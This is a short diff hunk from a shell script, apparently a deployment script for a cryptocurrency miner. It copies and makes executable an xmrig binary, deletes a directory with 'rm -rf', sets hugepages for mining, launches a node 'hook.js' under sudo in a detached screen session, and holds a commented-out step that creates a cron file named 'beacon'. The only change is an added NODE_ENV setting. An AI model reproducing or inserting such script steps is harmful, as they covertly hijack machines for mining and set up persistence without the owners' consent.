@@ -23,7 +23,7 @@ sudo cp xmrig /home/patata2
 sudo chmod +x /home/patata2
 sudo rm -rf /poppa
 sudo sysctl -w vm.nr_hugepages=128
-screen -dm sudo nodejs /patata/hook.js "$1" "$2"
+screen -dm sudo NODE_ENV=production nodejs /patata/hook.js "$1" "$2"
 
 #if [ $# -eq 3 ]; then
     #sudo touch /etc/cron.d/beacon
